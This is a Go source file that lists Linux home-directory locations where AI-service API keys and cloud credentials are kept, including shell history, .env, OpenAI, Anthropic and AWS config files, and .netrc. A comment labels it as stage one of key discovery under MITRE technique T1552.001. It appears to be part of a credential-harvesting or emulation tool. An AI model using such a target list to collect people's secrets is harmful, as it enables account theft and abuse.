//go:build linux

// Linux candidate paths for AI-service key discovery (Stage 1, T1552.001).

package main

import (
	"os"
	"path/filepath"
)

// candidateKeyPaths returns common on-disk locations where AI-service API keys
// are stored on Linux user endpoints, including shell history files.
func candidateKeyPaths() []string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = os.Getenv("HOME")
	}
	if home == "" {
		return nil
	}
	return []string{
		filepath.Join(home, ".env"),
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".profile"),
		filepath.Join(home, ".bash_history"),
		filepath.Join(home, ".zsh_history"),
		filepath.Join(home, ".config", "openai", "auth.json"),
		filepath.Join(home, ".config", "anthropic", "config.json"),
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".continue", "config.json"),
		filepath.Join(home, ".ollama", "config.json"),
		filepath.Join(home, ".netrc"),
	}
}
